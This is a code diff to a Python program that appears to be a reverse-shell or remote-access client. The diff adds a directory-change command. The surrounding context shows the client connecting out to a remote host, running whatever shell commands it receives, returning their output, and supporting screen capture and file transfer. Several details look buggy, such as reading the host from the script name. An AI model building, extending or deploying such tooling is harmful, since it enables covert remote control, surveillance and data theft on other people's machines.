@@ -64,6 +64,18 @@ def screen_capture(s):
     shutil.rmtree(temp_path)
 
 
+def change_working_directory(s, path):
+    if os.path.isdir(path):
+        os.chdir(path)
+        ret_str = '[*] CWD is ' + os.getcwd()
+    elif path == '':
+        ret_str = '[*] CWD is ' + os.getcwd()
+    else:
+        ret_str = '[!] %s is not a directory'
+
+    s.send(ret_str)
+
+
 def connect():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((sys.argv[0], int(sys.argv[1])))
@@ -86,6 +98,8 @@ def connect():
             receive_file(s, args)
         elif 'screencap' in action:
             screen_capture(s)
+        elif 'cd' in action:
+            change_working_directory(s, args)
         else:
             cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             s.send(cmd.stdout.read())
